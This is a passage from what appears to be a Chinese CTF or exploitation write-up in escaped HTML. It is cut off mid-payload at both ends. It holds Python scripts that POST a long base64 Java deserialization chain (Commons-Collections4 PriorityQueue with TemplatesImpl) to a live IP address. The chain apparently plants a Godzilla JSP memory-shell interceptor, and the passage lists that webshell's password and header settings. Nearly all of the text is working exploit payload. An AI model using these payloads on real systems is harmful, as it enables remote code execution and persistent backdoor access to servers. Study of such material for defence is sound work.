5dGVBcnJheU91dHB1dFN0cmVhbQEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0MAHcBlQEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtDAB3AZYMAZcBmAwBmQGaDAGbAZwMAOIA4wcBnQwBngGfAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAGgAXMMAHcBoQwBogGjDAGkAXUMAaUBpgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgwBpwBtAQAUY29tL2V4YW1wbGUvZXhwL2Rhd2QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmphdmEvdXRpbC9MaXN0AQASamF2YS91dGlsL0l0ZXJhdG9yAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAZrZXlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwEADWphdmEvdXRpbC9TZXQBAANnZXQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAIdG9TdHJpbmcBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRDbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL3V0aWwvQXJyYXlzAQAGYXNMaXN0AQAlKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvdXRpbC9MaXN0OwEAGShMamF2YS91dGlsL0NvbGxlY3Rpb247KVYBAAd0b0FycmF5AQAVKClbTGphdmEvbGFuZy9PYmplY3Q7AQAEc2l6ZQEAAygpSQEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2Zvck5hbWUBAAlnZXRNZXRob2QBAAUoW0IpVgEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEABHJlYWQBAAUoW0IpSQEABXdyaXRlAQAHKFtCSUkpVgEAC3RvQnl0ZUFycmF5AQAEKClbQgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWdldFN1cGVyY2xhc3MBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmVxdWFscwEAEWdldFBhcmFtZXRlclR5cGVzAQAUKClbTGphdmEvbGFuZy9DbGFzczsBAApnZXRNZXNzYWdlACEAagBrAAAAAAAQAAEAbABtAAEAbgAAAC0AAQABAAAAAxIBsAAAAAIAbwAAAAYAAQAAABsAcAAAAAwAAQAAAAMAcQByAAAAAQBzAG0AAQBuAAAALQABAAEAAAADEgKwAAAAAgBvAAAABgABAAAAHwBwAAAADAABAAAAAwBxAHIAAAABAHQAbQACAG4AAAAtAAEAAQAAAAMSA7AAAAACAG8AAAAGAAEAAAAjAHAAAAAMAAEAAAADAHEAcgAAAHUAAAAEAAEAdgABAHcAeAACAG4AAADPAAMABQAAADIqtwAEKrYABUwruQAGAQBNLLkABwEAmQAbLLkACAEATiottwAJOgQqLRkEtgAKp&#x2F;&#x2F;isQAAAAQAbwAAACYACQAAACYABAAnAAkAKAAQACoAGQArACAALAAnAC0ALgAuADEAMABwAAAANAAFACAADgB5AHoAAwAnAAcAewB6AAQAAAAyAHEAcgAAAAkAKQB8AH0AAQAQACIAfgB&#x2F;AAIAgAAAAAwAAQAJACkAfACBAAEAggAAABMAAv8AEAADBwCDBwCEBwCFAAAgAHUAAAAEAAEAJwABAIYAhwADAG4AAAA&#x2F;AAAAAwAAAAGxAAAAAgBvAAAABgABAAAANQBwAAAAIAADAAAAAQBxAHIAAAAAAAEAiACJAAEAAAABAIoAiwACAHUAAAAEAAEAjACNAAAACQIAiAAAAIoAAAABAIYAjgADAG4AAABJAAAABAAAAAGxAAAAAgBvAAAABgABAAAAOgBwAAAAKgAEAAAAAQBxAHIAAAAAAAEAiACJAAEAAAABAI8AkAACAAAAAQCRAJIAAwB1AAAABAABAIwAjQAAAA0DAIgAAACPAAAAkQAAAAEAkwCUAAMAbgAAAy4AAwAOAAABeLsAC1m3AAxMEg0SDrgAD8AAEMAAEMAAEE0BTiw6BCy+NgUDNgYVBhUFogFBGQQVBjI6BxkHtgAREhK2ABOZALMtxwCvGQcSFLgAFRIWuAAVEhe4ABXAABg6CBkItgAZuQAaAQA6CRkJuQAHAQCZAIAZCbkACAEAOgoZCBkKtgAbEhe4ABXAABg6CxkLtgAZuQAaAQA6DBkMuQAHAQCZAE0ZDLkACAEAOg0ZCxkNtgAbTi3GABottgActgAdEh62ABOZAAsrLbkAHwIAVy3GABottgActgAdEiC2ABOZAAsrLbkAHwIAV6f&#x2F;r6f&#x2F;fKcAdxkHtgAhxgBvGQe2ACG2ABy2ACISI7YAE5oAFhkHtgAhtgActgAiEiS2ABOZAEkZB7YAIRIluAAVEia4ABVOLcYAGi22ABy2AB0SHrYAE5kACystuQAfAgBXLcYAGi22ABy2AB0SILYAE5kACystuQAfAgBXhAYBp&#x2F;6+K7A6BLsAKFkZBLcAKb8AAQAbAWsBbAAnAAQAbwAAAIYAIQAAAD0ACAA+ABkAPwAbAEIAHgBDACIARQAsAEYAMwBHAEQASABaAEkAZgBLAHAATAB5AE0AigBOAJYAUACgAFEAqQBSALEAUwDEAFQAzABXAN8AWADnAFoA6gBbAO0AXAEeAF0BLgBeAUEAXwFJAGIBXABjAWQARQFqAGgBbABpAW4AagBwAAAAmAAPAKkAPgCVAHoADQB5AHEAlgB6AAoAigBgAJcAmAALAJYAVACZAH8ADABaAJMAmgCYAAgAZgCHAJsAfwAJADMBMQCcAJ0ABwAlAUUAngCfAAYAHgFOAKAAoQAEACIBSgCiAJ8ABQFuAAoAowCkAAQAAAF4AHEAcgAAAAgBcAB8AH0AAQAZAV8ApQChAAIAGwFdAHkAegADAIAAAAAMAAEACAFwAHwAgQABAIIAAABgAA3&#x2F;ACUABwcAgwcAhAcAEAcApgcAEAEBAAD+AEAHAKcHAKgHAIX+AC8HAKYHAKgHAIX8ADUHAKb6ABr4AAL5AAICLSr6ABr6AAX&#x2F;AAEABAcAgwcAhAcAEAcApgABBwCpAHUAAAAIAAMAZwBlAKoAqwAAAAIArAACAK0ArgACAG4AAAFwAAYACAAAAIcBTbgAKrYAIU4txwALK7YAHLYAK04tKrYALLYALbYALk2nAGQ6BCq2AC+4ADC4ADE6BRIyEjMGvQA0WQMSNVNZBLIANlNZBbIANlO2ADc6BhkGBLYAOBkGLQa9ADlZAxkFU1kEA7gAOlNZBRkFvrgAOlO2ADvAADQ6BxkHtgAuTacABToFLLAAAgAVACEAJAAnACYAgACDADwAAwBvAAAAPgAPAAAAbwACAHAACQBxAA0AcgAVAHYAIQCAACQAdwAmAHkAMgB6AFAAewBWAHwAegB9AIAAfwCDAH4AhQCCAHAAAABSAAgAMgBOAK8AsAAFAFAAMACxALIABgB6AAYAswC0AAcAJgBfAJsApAAEAAAAhwBxAHIAAAAAAIcAeQB6AAEAAgCFAHsAegACAAkAfgC1ALYAAwCCAAAAKwAE&#x2F;QAVBwCmBwC3TgcAqf8AXgAFBwCDBwCmBwCmBwC3BwCpAAEHALj6AAEAjQAAAAUBAHkAAAABALkAugADAG4AAAETAAcABwAAAHIqKyy2ABy2AB22AD2aAGUrEj4EvQA0WQMSOVMEvQA5WQMsU7gAP1enAEpOKxJAuAAPwABBwABBwABBOgQZBLgAQjoFuwALWRkFtwBDOgYZBiy2AERXKxJFBL0ANFkDEkFTBL0AOVkDGQa2AEZTuAA&#x2F;V7EAAQAPACcAKgAnAAMAbwAAACoACgAAAIYADwCIACcAjwAqAIkAKwCKADwAiwBDAIwATgCNAFUAjgBxAJIAcAAAAEgABwA8ADUAuwC8AAQAQwAuAL0AfQAFAE4AIwC+AL8ABgArAEYAwACkAAMAAAByAHEAcgAAAAAAcgB5AHoAAQAAAHIAewB6AAIAggAAAAkAAmoHAKn7AEYAdQAAAAQAAQAnAI0AAAAJAgB5AAAAewAAAAEAwQDCAAMAbgAAAPQAAwAHAAAATCsSQLgAD8AAQcAAQcAAQU4tuABCOgS7AAtZGQS3AEM6BQM2BhUGGQW2AEeiAB8ZBRUGtgBItgActgAdLLYAE5kABQSshAYBp&#x2F;&#x2F;dA6wAAAADAG8AAAAiAAgAAACVABAAlgAWAJcAIQCZAC4AmgBCAJsARACZAEoAnwBwAAAASAAHACQAJgDDAJ8ABgAAAEwAcQByAAAAAABMAHkAegABAAAATADEAMUAAgAQADwAuwC8AAMAFgA2AL0AfQAEACEAKwC+AL8ABQCCAAAAIAAD&#x2F;wAkAAcHAIMHAKYHAMYHAEEHAIQHAMcBAAAf+gAFAHUAAAAEAAEAJwCNAAAACQIAeQAAAMQAAAAIAMgAyQADAG4AAADqAAYABAAAAHASSbgASkwrEksEvQA0WQMSTFO2AE0rtgAuBL0AOVkDKlO2ADvAADXAADXAADWwTRJOuABKTCsSTwO9ADS2AE0BA70AObYAO04ttgAcElAEvQA0WQMSTFO2AE0tBL0AOVkDKlO2ADvAADXAADXAADWwAAEAAAAtAC4AJwADAG8AAAAaAAYAAAClAAYApgAuAKcALwCoADUAqQBIAKoAcAAAADQABQAGACgAygC0AAEASAAoAMsAegADAC8AQQCgAKQAAgAAAHAAzADFAAAANQA7AMoAtAABAIIAAAAGAAFuBwCpAHUAAAAKAAQAzQBlAKoAZwCNAAAABQEAzAAAAAkAzgDPAAMAbgAAANQABAAGAAAAPrsAUVm3AFJMuwBTWSq3AFRNuwBVWSy3AFZOEQEAvAg6BC0ZBLYAV1k2BZsADysZBAMVBbYAWKf&#x2F;6yu2AFmwAAAAAwBvAAAAHgAHAAAArwAIALAAEQCxABoAsgAhALUALQC2ADkAuQBwAAAAPgAGAAAAPgDQALAAAAAIADYA0QDSAAEAEQAtANMA1AACABoAJADVANYAAwAhAB0A1wCwAAQAKgAUANgAnwAFAIIAAAAcAAL&#x2F;ACEABQcANQcA2QcA2gcA2wcANQAA&#x2F;AAXAQB1AAAABAABAHYAjQAAAAUBANAAAAAIANwA3QADAG4AAABXAAIAAwAAABEqK7gAWk0sBLYAWywqtgBcsAAAAAIAbwAAAA4AAwAAAL0ABgC+AAsAvwBwAAAAIAADAAAAEQDeAHoAAAAAABEA3wDFAAEABgALAOAA4QACAHUAAAAEAAEAJwCNAAAACQIA3gAAAN8AAAAIAOIA4wADAG4AAADHAAMABAAAACgqtgAcTSzGABksK7YAXU4tBLYAWy2wTiy2AF9Np&#x2F;&#x2F;puwBeWSu3AGC&#x2F;AAEACQAVABYAXgAEAG8AAAAmAAkAAADDAAUAxQAJAMcADwDIABQAyQAWAMoAFwDLABwAzAAfAM8AcAAAADQABQAPAAcA4ADhAAMAFwAFAKAA5AADAAAAKADeAHoAAAAAACgA3wDFAAEABQAjALMAtAACAIAAAAAMAAEABQAjALMA5QACAIIAAAANAAP8AAUHAOZQBwDnCAB1AAAABAABAF4AjQAAAAkCAN4AAADfAAAAKADoAN0AAwBuAAAAQgAEAAIAAAAOKisDvQA0A70AObgAP7AAAAACAG8AAAAGAAEAAADTAHAAAAAWAAIAAAAOAOkAegAAAAAADgDqAMUAAQB1AAAACAADAGUAZwCqAI0AAAAJAgDpAAAA6gAAACkA6ADrAAMAbgAAAhcAAwAJAAAAyirBADSZAAoqwAA0pwAHKrYAHDoEAToFGQQ6BhkFxwBkGQbGAF8sxwBDGQa2AGE6BwM2CBUIGQe+ogAuGQcVCDK2AGIrtgBjmQAZGQcVCDK2AGS+mgANGQcVCDI6BacACYQIAaf&#x2F;0KcADBkGKyy2ADc6Baf&#x2F;qToHGQa2AF86Bqf&#x2F;nRkFxwAMuwBlWSu3AGa&#x2F;GQUEtgA4KsEANJkAGhkFAS22ADuwOge7AChZGQe2AGi3AGm&#x2F;GQUqLbYAO7A6B7sAKFkZB7YAaLcAab8AAwAlAHIAdQBlAJwAowCkAGcAswC6ALsAZwADAG8AAABuABsAAADXABQA2AAXANkAGwDbACUA3QApAN4AMADgADsA4QBWAOIAXQDjAGAA4ABmAOYAaQDnAHIA6wB1AOkAdwDqAH4A6wCBAO4AhgDvAI8A8QCVAPIAnAD0AKQA9QCmAPYAswD6ALsA+wC9APwAcAAAAHoADAAzADMAwwCfAAgAMAA2AOwA7QAHAHcABwDuAO8ABwCmAA0AmwDwAAcAvQANAPEA8AAHAAAAygDeAHoAAAAAAMoA6gDFAAEAAADKAPIA8wACAAAAygD0ALwAAwAUALYAswC0AAQAFwCzAPUAsgAFABsArwD2ALQABgCCAAAALwAODkMHAOb+AAgHAOYHAPcHAOb9ABcHAPgBLPkABQIIQgcA+QsNVAcA+g5HBwD6AHUAAAAIAAMAZQCqAGcAjQAAABEEAN4AAADqAAAA8gAAAPQAAAABAPsAAAACAPxwdAAEYWFhYXB3AQB4dXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAABdnIAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzAAAAAAAAAAAAAAB4cHcEAAAAA3ZyADdjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UckFYRmlsdGVyAAAAAAAAAAAAAAB4cHQAA2Jhcng=&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;requests&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;(burp0_url&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_headers&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;data&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span&gt;burp0_data)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;密码&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Bfzwcmbggsdytqtff
&lt;&#x2F;span&gt;&lt;span&gt;地址&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;&#x2F;*
&lt;&#x2F;span&gt;&lt;span&gt;请求头&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;User&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;Agent&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;Rechjn
&lt;&#x2F;span&gt;&lt;span&gt;脚本类型&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;JSP
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;写哥斯拉马脚本&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;requests
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;burp0_url &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;119.45.178.147:30000&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;burp0_cookies &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;JSESSIONID&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;91540884E76F00EB1BF1A5AAD6B0B504&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;burp0_headers &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Pragma&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;no-cache&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Cache-Control&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;no-cache&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Upgrade-Insecure-Requests&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Origin&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;119.45.178.147:30000&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Content-Type&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;application&#x2F;x-www-form-urlencoded&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;User-Agent&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;116.0.0.0 Safari&#x2F;537.36&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Accept&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q=0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q=0.8,application&#x2F;signed-exchange;v=b3;q=0.7&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Referer&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;http:&#x2F;&#x2F;119.45.178.147:30000&#x2F;shellAacw125&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Accept-Encoding&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;gzip, deflate&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Accept-Language&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;zh-CN,zh;q=0.9&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;Connection&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;close&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;burp0_data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;data&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci&#x2F;5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAKTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAL8HK&#x2F;rq+AAAANAFdCADRCADSCADTCgBXANQKAFYA1QoAVgDWCgBWANcKANgA2QoA2ADaCADbCgAmANwIAN0KAFYA3ggA3wgA4AgA4QgA4ggA4wcA5AgA5QcA5goAVgDnBwDoCADpCgATAOoIAHsKAFYA6wcA7AoAHADtCwDuAO8IAPAKABUA8QoAEwDyCgBWAPMKAFYA9AoAVgD1CgBWAPYHAPcIAIkHAIgJAPgA+QoAEwD6CgD7APwKAPgA&#x2F;QoA+wD+BwD&#x2F;CAEABwEBCAECCACTBwEDCgAzAQQIAQUKABMBBggBBwoAEwEICAEJCAEKCAELBwEMCgA8ANQHAQ0KAD4BDgcBDwoAQAEQCgBAAREKADwBEgoAPAETCgBWARQKARUA&#x2F;AoBFQEWCgATARcHARgKABMBGQoASQEaCgATARsKAPsBHAoAMAEdCgD7AR4HAR8KAFABGgcBIAcBIQoAUgEiCgBTARoHASMHASQBAA1nZXRVcmxQYXR0ZXJuAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGExjb20vZXhhbXBsZS9leHAvQXZ4ZXJiOwEADGdldENsYXNzTmFtZQEAD2dldEJhc2U2NFN0cmluZwEACkV4Y2VwdGlvbnMHASUBAAY8aW5pdD4BAAMoKVYBAAdjb250ZXh0AQASTGphdmEvbGFuZy9PYmplY3Q7AQALaW50ZXJjZXB0b3IBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwEmAQAQTWV0aG9kUGFyYW1ldGVycwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1